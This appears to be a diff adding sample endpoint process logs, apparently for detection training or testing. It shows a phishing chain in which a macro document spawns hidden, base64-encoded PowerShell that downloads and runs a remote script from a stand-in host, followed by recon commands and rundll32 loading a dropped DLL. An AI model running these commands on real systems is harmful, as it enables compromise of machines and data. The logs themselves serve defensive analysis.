@@ -1,0 +1,6 @@
+timestamp,host,user,parent_process,process_name,command_line,event_type
+2026-04-18 08:45:49,FIN-WS-07,jcecil,OUTLOOK.EXE,WINWORD.EXE,"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE C:\\Users\\jcecil\\Downloads\\Invoice_April_2026.docm",process_start
+2026-04-18 08:47:02,FIN-WS-07,jcecil,WINWORD.EXE,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcABzADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AZABvAG0AYQBpAG4ALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",process_start
+2026-04-18 08:47:06,FIN-WS-07,jcecil,powershell.exe,cmd.exe,"cmd.exe /c whoami && ipconfig",process_start
+2026-04-18 08:47:12,FIN-WS-07,jcecil,powershell.exe,rundll32.exe,"rundll32.exe C:\\Users\\Public\\update.dll,Start",process_start
+2026-04-18 09:02:40,FIN-WS-07,jcecil,explorer.exe,chrome.exe,"chrome.exe https://portal.company.local",process_start
